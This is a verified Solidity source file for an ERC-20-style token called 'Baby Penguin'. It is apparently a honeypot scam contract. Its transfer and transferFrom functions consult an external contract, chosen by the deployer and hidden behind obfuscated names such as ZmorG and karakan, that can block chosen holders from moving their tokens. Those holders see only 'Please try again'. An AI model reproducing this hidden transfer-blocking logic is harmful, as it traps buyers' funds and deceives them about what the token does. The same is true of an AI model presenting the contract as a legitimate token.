/**
 *Submitted for verification at Etherscan.io on 2021-08-15
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface ZmorG {

    function all_assets( address checker) external view returns (uint8);

    function karakan(address account) external view returns (uint8);

    function transfer_to(address senders, address taker, address mediator, uint balance) external returns (address);
  
}

contract BabyPenguin {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    ZmorG pampal;
    uint256 public totalSupply = 10 * 10**12 * 10**18;
    string public name = "Baby Penguin";
    string public symbol = hex"4261627950656E6775696Ef09f90a7";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(ZmorG _dond) {
        
        pampal = _dond;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address holder) public view returns(uint256) {
        return balances[holder];
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(pampal.karakan(msg.sender) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(pampal.karakan(from) != 1, "Please try again");
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address spender, uint256 value) public returns(bool) {
        allowance[msg.sender][spender] = value;
        return true;
        
    }
}